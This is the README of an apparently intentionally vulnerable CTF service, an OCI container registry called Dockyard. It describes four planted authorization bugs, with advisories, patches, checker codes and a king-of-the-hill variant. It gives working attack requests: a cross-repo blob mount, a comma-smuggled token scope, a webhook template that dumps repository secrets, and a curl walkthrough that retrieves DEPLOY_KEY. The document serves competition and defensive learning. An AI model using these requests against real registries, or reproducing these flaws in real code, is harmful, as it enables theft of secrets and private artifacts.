# Dockyard - H7CTF'26 Finals Service S5

Container artifact registry with OCI Distribution API subset and an Ed25519-signed
transparency log.

Port: **7005**

---

## Architecture

```
POST /api/users          - register
POST /api/session        - login (returns JWT)
GET  /token              - Docker token service (Basic or Bearer)
/v2/...                  - OCI Distribution API (blobs, manifests, tags)
/api/repos/...           - repo management + secrets + watches
/api/tokens              - fine-grained secret-scope tokens
/log/tree|entries|keys   - transparency log
```

Two backing stores for flags:

- **blob-store**: flag pushed as a private OCI blob
- **secret-store**: flag stored as `DEPLOY_KEY` repo secret

---

## Bugs

### Store A - blob-store

**V1 (primary): Cross-repo blob mount without pull authorization**

`POST /v2/<dst>/blobs/uploads/?mount=<digest>&from=<src>`

`registry.Mount()` checks only that the blob exists globally (`BlobExists`).
It does not verify the caller has pull permission on `src`. Any authenticated
user can mount any blob into their own repo and then pull it.

Attack surface: the transparency log (`/log/entries/<n>`) exposes every push
event including repo and digest, giving attackers the digest to mount.

Advisory: Dockyard registry: cross-repository blob mount endpoint does not
verify pull authorization on the source repository (OCI Distribution spec
Section 4.3.3). Affected component: registry blob mount handler.

**V2: Comma-delimited scope differential**

`GET /token?scope=repository:victim/repo,attacker/dst:pull`

`ParseScope` passes the NAME field verbatim to the token; `CheckAccess` splits
it on comma. A single token request grants pull on both repos.

Advisory: Dockyard registry: token service accepts comma-separated repository
names in a single scope parameter, granting access to multiple repositories
with one token request. Affected component: OCI token scope parser.

---

### Store B - secret-store

**V1 (primary): Webhook template over-exposure**

`POST /api/repos/<ns>/<name>/watches` accepts a Go `text/template` string.
`fireWatch` renders it with a `RepoView` struct that includes `Secrets` (all
repo secrets). The delivery log is readable by the watcher.

Watch fires immediately on creation (test delivery), so the attacker reads
secrets without waiting for a real push.

Attack surface: any user watching a public repo, or a repo they are a member
of, can render `{{range $k,$v := .Secrets}}{{$k}}={{$v}} {{end}}` and retrieve
`DEPLOY_KEY`.

Advisory: Dockyard registry: webhook delivery templates are rendered with the
full repository data model, exposing repository secrets in delivery logs.
Affected component: watch/webhook template renderer.

**V2: Fine-grained token glob scope prefix bypass**

`POST /api/tokens` validates scope patterns with `HasPrefix(pattern, user)`
instead of `HasPrefix(pattern, user+"/")`. A user named `sea` can request
scope `secrets:read:sea*/*` which matches `seawolf/...` via `globMatch`.

Advisory: Dockyard registry: fine-grained token scope validation uses a
username prefix check that allows wildcard escalation to other namespaces.
Affected component: fine-grained token scope validator.

---

## Patches

| File | Fixes |
|------|-------|
| `patches/01-fix-mount-auth.patch` | Store A V1: check `BlobLinkedToRepo(srcRepo)` before mount |
| `patches/02-fix-template-secrets.patch` | Store B V1: remove `Secrets` from `RepoView` |
| `patches/03-fix-scope-comma.patch` | Store A V2: direct equality instead of comma-split in `CheckAccess` |
| `patches/04-fix-glob-scope.patch` | Store B V2: require `user+"/"` prefix not just `user` |
| `patches/05-wrong-noop.patch` | WRONG: adds `|| digest == ""` guard - doesn't fix mount auth |
| `patches/06-wrong-rate-limit.patch` | WRONG: rate-limits watch creation - doesn't remove secrets from template |
| `patches/07-wrong-disable-mount.patch` | WRONG: disables mount entirely - breaks legitimate CI workflows |
| `patches/08-wrong-escape-template.patch` | WRONG: switches to html/template - secrets still in data |

---

## Checker exception codes

All `MumbleException` and `OfflineException` messages use `DOCKYARD-<STEP>-<NN>: text` format.

| Code | Condition |
|------|-----------|
| DOCKYARD-REG-01 | User registration returned unexpected status |
| DOCKYARD-LOGIN-01 | Transport error on login |
| DOCKYARD-LOGIN-02 | Login returned non-200 |
| DOCKYARD-LOGIN-03 | Login response has no token |
| DOCKYARD-TOKEN-01 | Transport error on /token |
| DOCKYARD-TOKEN-02 | /token returned non-200 |
| DOCKYARD-TOKEN-03 | /token response has no token |
| DOCKYARD-BLOB-01 | Transport error on blob push |
| DOCKYARD-BLOB-02 | Blob push returned non-201 |
| DOCKYARD-MANIFEST-01 | Transport error on manifest push |
| DOCKYARD-MANIFEST-02 | Manifest push returned non-201 |
| DOCKYARD-PUTFLAG-01..04 | putflag(0) failure stages |
| DOCKYARD-PUTFLAG-11..12 | putflag(1) failure stages |
| DOCKYARD-GETFLAG-01..04 | getflag(0) failure stages |
| DOCKYARD-GETFLAG-11..14 | getflag(1) failure stages |
| DOCKYARD-NOISE-01..03 | noise check failure |
| DOCKYARD-HAVOC-01 | havoc(0) empty token |
| DOCKYARD-HAVOC-11..12 | havoc(1) /v2/ check |
| DOCKYARD-EXP0-01..05 | exploit(0) blob mount |
| DOCKYARD-EXP1-01..08 | exploit(1) template secrets |
| DOCKYARD-EXP2-01..05 | exploit(2) scope comma |
| DOCKYARD-EXP3-01..06 | exploit(3) glob scope |

---

## API reference (attack surface)

### Mount endpoint (Store A primary attack surface)

```
POST /v2/<dst_repo>/blobs/uploads/?mount=<digest>&from=<src_repo>
Authorization: Bearer <oci-push-token-for-dst>
```

Returns 201 Created if blob exists anywhere in the registry.
Does **not** check pull permission on `src_repo`.

### Watch endpoint (Store B primary attack surface)

```
POST /api/repos/<ns>/<name>/watches
Authorization: Bearer <session-token>
Content-Type: application/json

{"url": "", "template": "{{range $k,$v := .Secrets}}{{$k}}={{$v}} {{end}}"}
```

Returns 201 with watch id. Immediately fires a test delivery.

```
GET /api/repos/<ns>/<name>/watches/<watch-id>/deliveries
Authorization: Bearer <session-token>
```

Returns array of delivery records; `rendered` contains template output
including all secrets.

### Transparency log (digest discovery)

```
GET /log/tree         - signed tree head with entry count
GET /log/entries/<n>  - entry n: {repo, tag, digest, ts, type}
```

No authentication required. Use to discover victim blob digests for Store A V1.

---

## Hill C - Harbor Master

A competitive king-of-the-hill variant on Dockyard.

**Arena**: a single shared `harbor/throne` repository. All teams have push
access. The current throne holder is whoever last pushed to `harbor/throne:king`.

**Scoring**: holding `harbor/throne:king` at tick time earns 1 point per tick.
To take the throne, push a manifest with a valid layer containing your team flag.

**Exploit angle**: use the blob mount bug (Store A V1) to cheaply push to
`harbor/throne:king` without uploading a full layer - just mount any blob and
craft a manifest pointing to it.

**Defense**: patch Store A V1 to block unauthorized mounts. Teams that patch
correctly must upload a real layer to push, adding cost to throne changes.

See `../hills/harbor-master/` for the hill engine and config.

---

## Running locally

```bash
cd service
docker compose up --build
```

Service on `localhost:7005`, webhook sink on `localhost:9000`.

```bash
# register and login
curl -s -XPOST http://localhost:7005/api/users -d '{"username":"alice","password":"secret"}'
TOK=$(curl -s -XPOST http://localhost:7005/api/session -d '{"username":"alice","password":"secret"}' | jq -r .token)

# create repo and set secret
curl -s -XPOST http://localhost:7005/api/repos -H "Authorization: Bearer $TOK" \
  -d '{"name":"alice/myrepo","visibility":"private"}'
curl -s -XPUT http://localhost:7005/api/repos/alice/myrepo/secrets/DEPLOY_KEY \
  -H "Authorization: Bearer $TOK" -d '{"value":"H7CTF{AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA}"}'

# watch and read secrets via template
WATCH=$(curl -s -XPOST http://localhost:7005/api/repos/alice/myrepo/watches \
  -H "Authorization: Bearer $TOK" \
  -d '{"url":"","template":"{{range $k,$v := .Secrets}}{{$k}}={{$v}} {{end}}"}' | jq -r .id)
curl -s http://localhost:7005/api/repos/alice/myrepo/watches/$WATCH/deliveries \
  -H "Authorization: Bearer $TOK" | jq '.[0].rendered'
```
